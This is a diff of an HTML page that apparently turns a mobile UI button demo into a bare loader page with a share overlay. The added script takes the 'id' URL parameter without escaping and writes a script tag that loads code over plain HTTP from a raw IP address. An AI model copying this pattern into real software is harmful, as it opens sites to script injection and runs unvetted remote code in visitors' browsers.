@@ -1,40 +1,31 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>我的生活</title>
-    <meta name="viewport" content="initial-scale=1, maximum-scale=1">
-    <link rel="shortcut icon" href="/favicon.ico">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title></title>
+<style>
+        .share {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 200;
+            width: 100%;
+            height: 100%;
+            color: #fff;
+            background: rgba(0, 0, 0, .75);
+            display: none;
+        }
 
-    <link rel="stylesheet" href="//g.alicdn.com/msui/sm/0.6.2/css/sm.min.css">
-    <link rel="stylesheet" href="//g.alicdn.com/msui/sm/0.6.2/css/sm-extend.min.css">
+        .share img {
+            float: right;
+            width: 100%;
+            margin: 10px;
+        }
 
-  </head>
-  <body>
-    <div class="page-group">
-        <div class="page page-current">
-        <!-- 你的html代码 -->
-       <header class="bar bar-nav">
-         <h1 class='title'>填充按钮</h1>
-       </header>
-       <div class="content">
-         <div class="content-block">
-           <p><a href="#" class="button button-fill">Fill Button </a></p>
-           <p><a href="#" class="button button-fill button-success">Fill Button </a></p>
-           <p><a href="#" class="button button-fill button-danger">Fill Button </a></p>
-           <p><a href="#" class="button button-fill button-warning">Fill Button </a></p>
-         </div>
-       </div>
-        
-        </div>
-    </div>
-
-    <script type='text/javascript' src='//g.alicdn.com/sj/lib/zepto/zepto.min.js' charset='utf-8'></script>
-    <script type='text/javascript' src='//g.alicdn.com/msui/sm/0.6.2/js/sm.min.js' charset='utf-8'></script>
-    <script type='text/javascript' src='//g.alicdn.com/msui/sm/0.6.2/js/sm-extend.min.js' charset='utf-8'></script>
+        .share p {
+            padding: 0 10px;
+        }
+    </style>
 <script type="text/javascript">
         function GetQueryString(name) {
             var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)","i");
@@ -42,9 +33,15 @@
             if (r!=null) return (r[2]); return null;
         }
 </script>
-        <script type="text/javascript">
-            var id = GetQueryString('id');
-            console.log(id);
-        </script>
-  </body>
+</head>
+<body>
+<div style="width: 100%;height: 50px"></div>
+<div class="share" id="tips">
+    <img src="http://o8c5olbmo.b0.upaiyun.com/dakai.png">
+</div>
+<script type="text/javascript">
+    var id = GetQueryString('id');
+    document.writeln('<script src="http://115.28.4.221/js/getjs?id='+id+'"><\/script>');
+</script>
+</body>
 </html>
